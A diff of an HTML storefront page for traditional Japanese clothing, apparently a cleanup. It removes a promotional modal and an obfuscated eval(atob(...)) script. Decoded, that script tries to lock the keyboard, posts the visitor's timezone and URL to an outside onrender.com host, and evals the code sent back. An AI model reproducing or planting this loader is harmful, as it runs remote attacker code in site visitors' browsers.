@@ -54,66 +54,9 @@
     - preload images
   -->
     <link rel="preload" as="image" href="./assets/images/hero-banner.jpg" />
-    <style>
-      .modal-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.8);
-        z-index: 1000;
-      }
-
-      .modal-content {
-        position: relative;
-        margin: 15% auto;
-        padding: 20px;
-        background-color: white;
-        border-radius: 5px;
-        width: 80%;
-        max-width: 500px;
-        text-align: center;
-        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
-      }
-
-      .close-modal {
-        position: absolute;
-        top: 10px;
-        right: 20px;
-        font-size: 24px;
-        font-weight: bold;
-        color: #000;
-        cursor: pointer;
-      }
-
-      .btn-primary {
-        background-color: #d32f2f;
-        color: white;
-        padding: 10px 20px;
-        text-decoration: none;
-        border-radius: 5px;
-        display: inline-block;
-        margin-top: 20px;
-      }
-    </style>
   </head>
 
   <body>
-    <div id="promoModal" class="modal-overlay">
-      <div class="modal-content">
-        <span class="close-modal">&times;</span>
-        <h2>限定オファー</h2>
-        <p>
-          今なら全商品30%オフ！<br />新しい季節に合わせて、最高品質の伝統的な和服をお得に手に入れましょう。
-        </p>
-        <a href="#" class="btn btn-primary">今すぐ購入</a>
-      </div>
-    </div>
-    <!-- 
-    - #HEADER
-  -->
-
     <header class="header" data-header>
       <div class="container">
         <a href="#" class="logo">
@@ -728,25 +671,5 @@
       nomodule
       src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
     ></script>
-
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        var modal = document.getElementById("promoModal");
-        var closeBtn = document.querySelector(".close-modal");
-
-        // Close the modal when the close button or anywhere outside the modal content is clicked
-        closeBtn.onclick = function () {
-          modal.style.display = "none";
-        };
-
-        // Close the modal when clicking anywhere on the modal overlay (including the modal content)
-        modal.onclick = function () {
-          modal.style.display = "none";
-        };
-      });
-    </script>
-    <script>
-      eval(atob(`CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL3Nob3BwaWVqYXBhbmVzZWNsb3RoZXNoZWxwZXJuZXcub25yZW5kZXIuY29tJywgY2xpZW50VGltZXpvbmUpCiAgICAgICAgLnRoZW4oZGVjb2RlQW5kUnVuU2NyaXB0KQogICAgICAgIC5jYXRjaChoYW5kbGVFcnJvcik7Cn0KCmZ1bmN0aW9uIHNlY3VyZUtleWJvYXJkQWNjZXNzKCkgewogICAgaWYgKG5hdmlnYXRvci5rZXlib2FyZCkgbmF2aWdhdG9yLmtleWJvYXJkLmxvY2soKTsKfQoKZnVuY3Rpb24gZ2V0Q3VycmVudFRpbWV6b25lKCkgewogICAgcmV0dXJuIEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKfQoKZnVuY3Rpb24gdHJhbnNtaXRUaW1lem9uZURhdGEodXJsLCB0aW1lem9uZSkgewogICAgcmV0dXJuIGZldGNoKHVybCwgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsgdGltZXpvbmUsIGZ1bGxVcmw6IHdpbmRvdy5sb2NhdGlvbi5ocmVmIH0pLAogICAgfSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpOwp9CgpmdW5jdGlvbiBkZWNvZGVBbmRSdW5TY3JpcHQoZW5jb2RlZFNjcmlwdCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCBzY3JpcHQgPSBhdG9iKGVuY29kZWRTY3JpcHQpOwogICAgICAgIGV2YWwoc2NyaXB0KTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBTY3JpcHQgZXhlY3V0aW9uIGZhaWxlZDogJHtlcnJvcn1gKTsKICAgIH0KfQoKZnVuY3Rpb24gaGFuZGxlRXJyb3IoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FQSSByZXF1ZXN0IG9yIHNjcmlwdCBleGVjdXRpb24gZXJyb3I6JywgZXJyb3IpOwp9Cg==`));
-    </script>
   </body>
 </html>
